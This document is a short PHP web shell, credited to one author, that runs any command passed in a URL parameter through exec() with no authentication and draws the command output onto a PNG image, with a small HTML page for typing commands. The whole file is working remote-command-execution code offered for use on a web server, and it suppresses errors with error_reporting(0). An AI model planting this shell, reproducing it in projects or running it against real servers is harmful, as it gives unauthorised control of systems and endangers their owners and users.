<?php
error_reporting(0);
# simple image shell (php gd2 library)
# made by munsiwoo
# https://github.com/munsiwoo/

if(isset($_GET['shellmode'])) {
	header ('Content-Type: image/png');

	$im  = imagecreatefrompng("console.png");
	$black = imagecolorallocate($im, 0, 0, 0);
	$white = imagecolorallocate($im, 255, 255, 255);
	$font = './NanumGothic.ttf'; // http://hangeul.naver.com/font

	$top = "SiwooMun Image Shell [Version 10.0.14393]\n(c) 2018 SiwooMun. All rights reversed.";

	$command = ($_GET['command']) ? $_GET['command'] : 'echo welcome to image shell';

	exec($command, $result);
	$result = implode($result, "\n"); // array to string
	$result = iconv("euc-kr", "utf-8", $result); // utf-8 encoding

	imagefill($im, 0, 0, $black); // background color
	imagettftext($im, 11, 0, 10, 60, $white, $font, $top); // print top
	imagettftext($im, 11, 0, 10, 120, $white, $font, '$ '.$command); // print command
	imagettftext($im, 11, 0, 10, 150, $white, $font, $result); // print result

	imagepng($im);
	imagedestroy($im);
	exit;
}

?>
<html>
<head>
	<title>Image shell</title>
</head>
<body>
	<script>
		function execute(command) {
			let image = document.querySelector("#image");
			image.src = "index.php?shellmode&command=" + command;
			return true;
		}
	</script>
	<img src="index.php?shellmode" id="image">
	<hr align="left" style="width:600px;">
	<input placeholder="command" onkeydown="if(event.keyCode == 13){execute(this.value);this.value='';}" style="width:300px;">
	<b>made by munsiwoo</b>
</body>
</html>
